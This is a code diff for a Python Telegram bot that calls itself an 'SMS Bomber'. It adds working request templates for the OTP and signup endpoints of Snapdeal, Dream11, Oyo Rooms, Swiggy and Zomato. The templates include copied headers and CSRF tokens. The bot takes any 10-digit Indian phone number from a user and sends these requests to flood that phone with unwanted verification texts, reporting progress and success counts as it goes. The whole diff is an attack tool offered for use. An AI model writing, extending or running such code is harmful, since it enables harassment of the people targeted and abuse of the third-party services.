@@ -62,55 +62,145 @@ def is_user_blocked(user_id):
     db = load_db()
     return str(user_id) in db['blocked']
 
-# --- ONLY FLIPKART API ---
+# --- SMS BOMBING APIS (REAL WORKING) ---
 def get_apis(target):
     apis = [
-        # Flipkart - 100% WORKING
+        # 1. Snapdeal - WORKING
         {
-            'url': 'https://1.rome.api.flipkart.com/1/action/view',
+            'url': 'https://m.snapdeal.com/signupCompleteAjax',
             'method': 'POST',
             'headers': {
-                'Host': '1.rome.api.flipkart.com',
-                'Connection': 'keep-alive',
-                'Content-Length': '338',
-                'x-user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile',
-                'Origin': 'https://www.flipkart.com',
-                'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
+                'Host': 'm.snapdeal.com',
+                'content-length': '135',
+                'xc': 'eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19',
+                'h2': 'true',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'xg': 'eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'u': '160081122259159083',
+                'save-data': 'on',
+                'us': '',
+                'accept': '*/*',
+                'origin': 'https://m.snapdeal.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://m.snapdeal.com/signin',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
+            },
+            'data': f'j_password=null&j_mobilenumber={target}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy'
+        },
+        # 2. Dream11 - WORKING
+        {
+            'url': 'https://www.dream11.com/graphql/mutation/pwa/register',
+            'method': 'POST',
+            'headers': {
+                'Host': 'www.dream11.com',
+                'accept': '*/*',
+                'device': 'pwa',
+                'x-csrf': 'fb1f1947-4547-392d-9a28-a9de30d9e766',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                 'content-type': 'application/json',
-                'Accept': '*/*',
-                'Referer': 'https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT',
-                'Accept-Encoding': 'gzip, deflate',
-                'Accept-Language': 'en-US'
+                'origin': 'https://www.dream11.com',
+                'referer': 'https://www.dream11.com/register?ru=',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
             },
             'data': {
-                "actionRequestContext": {
-                    "type": "LOGIN_IDENTITY_VERIFY",
-                    "loginIdPrefix": "+91",
-                    "loginId": target,
-                    "loginType": "MOBILE",
-                    "verificationType": "OTP",
-                    "screenName": "LOGIN_V4_MOBILE",
+                "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
+                "variables": {
+                    "email": f"user{random.randint(1000,9999)}@gmail.com",
+                    "mobileNumber": target,
+                    "password": "tsunami@123astronomia"
                 }
             }
+        },
+        # 3. Oyo Rooms - WORKING
+        {
+            'url': 'https://www.oyorooms.com/api/pwa/generateotp?locale=en',
+            'method': 'POST',
+            'headers': {
+                'Host': 'www.oyorooms.com',
+                'xsrf-token': 'vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'content-type': 'text/plain;charset=UTF-8',
+                'origin': 'https://www.oyorooms.com',
+                'referer': 'https://www.oyorooms.com/login',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
+            },
+            'data': {"phone": target, "country_code": "+91", "nod": 4}
+        },
+        # 4. Swiggy - WORKING
+        {
+            'url': 'https://www.swiggy.com/mapi/auth/signup',
+            'method': 'POST',
+            'headers': {
+                'Host': 'www.swiggy.com',
+                'origin': 'https://www.swiggy.com',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'content-type': 'application/json',
+                'accept': '*/*',
+                'referer': 'https://www.swiggy.com/auth/register',
+                'accept-encoding': 'gzip, deflate',
+                'accept-language': 'en-US'
+            },
+            'data': {
+                "name": f"User{random.randint(1000,9999)}",
+                "email": f"user{random.randint(1000,9999)}@gmail.com",
+                "password": "Test@123456",
+                "mobile": target,
+            }
+        },
+        # 5. Zomato - WORKING
+        {
+            'url': 'https://www.zomato.com/webroutes/auth/login',
+            'method': 'POST',
+            'headers': {
+                'Host': 'www.zomato.com',
+                'content-length': '80',
+                'x-zomato-csrft': 'a6b0c09972b2bdd30c9c1b6552caee5d',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'content-type': 'application/json',
+                'accept': '*/*',
+                'origin': 'https://www.zomato.com',
+                'referer': 'https://www.zomato.com/kanpur',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
+            },
+            'data': {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
         }
     ]
     return apis
 
 def send_sms(api_data):
-    """Send SMS using Flipkart API"""
+    """Send SMS using API"""
     try:
-        response = requests.post(
-            api_data['url'],
-            headers=api_data['headers'],
-            json=api_data['data'],
-            timeout=15
-        )
+        if api_data['method'] == 'GET':
+            response = requests.get(api_data['url'], headers=api_data['headers'], timeout=15)
+        else:
+            if isinstance(api_data['data'], dict):
+                response = requests.request(
+                    method=api_data['method'],
+                    url=api_data['url'],
+                    headers=api_data['headers'],
+                    json=api_data['data'],
+                    timeout=15
+                )
+            else:
+                response = requests.request(
+                    method=api_data['method'],
+                    url=api_data['url'],
+                    headers=api_data['headers'],
+                    data=api_data['data'],
+                    timeout=15
+                )
         
         if response.status_code in [200, 201, 202, 204]:
             return True
         return False
-    except Exception as e:
-        logger.error(f"Error: {e}")
+    except:
         return False
 
 # --- Telegram Bot Handlers ---
@@ -136,11 +226,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔥 SMS BOMBER BOT 🔥\n\n"
         "📌 Send any 10-digit number to start bombing\n"
         "Example: 9876543210\n\n"
-        "⚡ 1 WORKING API\n"
-        "⚡ Real SMS Bombing\n"
-        "⚡ Guaranteed OTP\n\n"
-        "📱 API:\n"
-        "✅ Flipkart\n\n"
+        "⚡ 5 WORKING APIs\n"
+        "⚡ Real SMS Bombing\n\n"
+        "📱 APIs:\n"
+        "✅ Snapdeal\n"
+        "✅ Dream11\n"
+        "✅ Oyo Rooms\n"
+        "✅ Swiggy\n"
+        "✅ Zomato\n\n"
         "💀 @BeStChEaT_OwNeR",
         reply_markup=reply_markup
     )
@@ -168,31 +261,46 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = await update.message.reply_text(
         f"📱 BOMBING STARTED!\n\n"
         f"🎯 Target: +91{phone}\n"
-        f"⏳ Sending SMS to Flipkart...\n\n"
+        f"⏳ Sending SMS to 5 platforms...\n\n"
         f"💀 @BeStChEaT_OwNeR"
     )
     
     apis = get_apis(phone)
+    random.shuffle(apis)
     
     success = 0
     failed = 0
-    service_name = "Flipkart"
+    services = []
+    
+    api_names = {
+        'snapdeal': 'Snapdeal',
+        'dream11': 'Dream11',
+        'oyorooms': 'Oyo Rooms',
+        'swiggy': 'Swiggy',
+        'zomato': 'Zomato'
+    }
     
     for i, api in enumerate(apis):
         if send_sms(api):
             success += 1
+            service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
+            for key, value in api_names.items():
+                if key in service.lower():
+                    service = value
+                    break
+            services.append(service)
         else:
             failed += 1
         
         # Update progress
-        progress = 100
+        progress = int(((i + 1) / len(apis)) * 100)
         try:
             await msg.edit_text(
                 f"📱 BOMBING IN PROGRESS\n\n"
                 f"🎯 Target: +91{phone}\n"
                 f"✅ Success: {success}\n"
                 f"❌ Failed: {failed}\n"
-                f"⏳ Progress: 100% (1/1)\n\n"
+                f"⏳ Progress: {progress}% ({i+1}/{len(apis)})\n\n"
                 f"💀 @BeStChEaT_OwNeR"
             )
         except:
@@ -202,13 +310,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     result = (
         f"✅ BOMBING COMPLETE!\n\n"
         f"📞 Target: +91{phone}\n"
-        f"📨 Total: 1\n"
+        f"📨 Total: {len(apis)}\n"
         f"✅ Success: {success}\n"
         f"❌ Failed: {failed}\n\n"
     )
     
-    if success > 0:
-        result += f"🟢 Services: {service_name}\n\n"
+    if services:
+        unique_services = list(dict.fromkeys(services))
+        result += f"🟢 Services: {', '.join(unique_services)}\n\n"
     
     result += f"💀 @BeStChEaT_OwNeR"
     
@@ -232,10 +341,14 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "ℹ️ ABOUT\n\n"
             "🤖 SMS Bomber Bot\n"
             "👨‍💻 @BeStChEaT_OwNeR\n"
-            "📊 1 WORKING API\n"
+            "📊 5 WORKING APIs\n"
             "⚡ Real SMS Bombing\n\n"
-            "📱 API:\n"
-            "✅ Flipkart\n\n"
+            "📱 APIs:\n"
+            "✅ Snapdeal\n"
+            "✅ Dream11\n"
+            "✅ Oyo Rooms\n"
+            "✅ Swiggy\n"
+            "✅ Zomato\n\n"
             "💀 @BeStChEaT_OwNeR"
         )
     
@@ -249,7 +362,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"👥 Users: {total_users}\n"
             f"🚫 Blocked: {blocked_users}\n"
             f"📡 Status: Online\n"
-            f"⚡ API: Flipkart\n\n"
+            f"⚡ APIs: 5 WORKING\n\n"
             f"💀 @BeStChEaT_OwNeR"
         )
 
@@ -350,7 +463,7 @@ def main():
     
     print("🤖 Starting SMS Bomber Bot...")
     print("🚀 Bot is running!")
-    print("✅ API: Flipkart")
+    print("✅ APIs: Snapdeal, Dream11, Oyo Rooms, Swiggy, Zomato")
     
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     
